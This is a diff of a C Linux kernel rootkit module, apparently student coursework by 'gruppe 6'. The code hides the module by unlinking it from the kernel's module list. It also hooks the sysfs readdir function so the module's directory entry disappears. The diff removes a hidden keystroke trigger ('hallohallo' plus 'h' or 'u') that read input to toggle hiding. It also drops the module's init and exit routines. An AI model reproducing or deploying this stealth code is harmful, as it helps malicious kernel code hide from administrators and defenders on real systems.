@@ -16,10 +16,7 @@ fun_int_file_dirent_filldir_t original_sysfs_readdir;
 filldir_t original_sysfs_filldir;
 
 
-char activate_pattern[] = "hallohallo";
-int size_of_pattern = sizeof(activate_pattern)-1;
-int cur_position = 0;
-int last_match = -1;
+
 
 int hidden = 0;
 
@@ -33,7 +30,7 @@ typedef int (*fun_int_void)(void);
 /*
  * Hiding a module is basically just removing it from the list of modules
  */
-void hide_me(void)
+void hide_module(void)
 {
     struct list_head *prev;
     struct list_head *next;
@@ -44,10 +41,11 @@ void hide_me(void)
     prev->next = next;
     next->prev = prev;
     hidden = 1;
+    hook_sysfs();
 }
 
 
-void unhide_me(void)
+void unhide_module(void)
 {
     struct list_head *mods;
     struct list_head *this_list_head;
@@ -66,66 +64,12 @@ void unhide_me(void)
     this_list_head->prev = mods; // let out prev pointer point to the modules list
 
     hidden = 0;
-}
-
-static void handleChar(char c){
-    if(c=='\n' || c == '\r'){ //cancel command with newline
-//        OUR_DEBUG("newline");
-        last_match = -1;
-        cur_position = 0;
-    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
-        if(c == 'h'){ //hide
-            OUR_DEBUG("HIDE THIS MODULE");
-            hide_me();
-            last_match = -1;
-            cur_position = 0;
-        } else if(c == 'u') { //unhide
-            OUR_DEBUG("UNHIDE THIS MODULE");
-            unhide_me();
-            last_match = -1;
-            cur_position = 0;
-        } else {
-            //ignore everything else and wait for a valid command
-        }
-    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
-        if(c == activate_pattern[cur_position]) { // match further
-//            OUR_DEBUG("match %c", c);
-            last_match++;
-            cur_position++;
-        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
-//            OUR_DEBUG("backspace but right");
-            if(cur_position != 0){
-                last_match--;
-                cur_position--;
-            }
-        } else { // wrong char
-//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
-            cur_position++;
-        }
-    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
-        if(c == 127 || c == '\b'){
-//            OUR_DEBUG("backspace wrong");
-            if(cur_position != 0){
-                cur_position--;
-            }
-        } else {
-//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
-            cur_position++;
-        }
-    }
-}
-
-static void handle_input(char *buf, int count)
-{
-    int i;
-    for(i = 0; i<count; i++){
-        handleChar(buf[i]);
-    }
+    unhook_sysfs();
 }
 
 
 int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    if (hidden && strcmp(name, THIS_MODULE->name) == 0){
+    if (strcmp(name, THIS_MODULE->name) == 0){
         OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
         return 0;
     }
@@ -156,27 +100,3 @@ void unhook_sysfs(void){
     sysfs_dir_ops->readdir = original_sysfs_readdir;
     make_page_readonly((long unsigned int) sysfs_dir_ops);
 }
-
-
-/* Initialization routine */
-static int __init _init_module(void)
-{
-    printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
-    hook_read(handle_input);
-    hook_sysfs();
-
-    return 0;
-}
-
-/* Exiting routine */
-static void __exit _cleanup_module(void)
-{
-    unhook_sysfs();
-    unhook_read();
-    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
-}
-
-
-/* Declare init and exit routines */
-module_init(_init_module);
-module_exit(_cleanup_module);
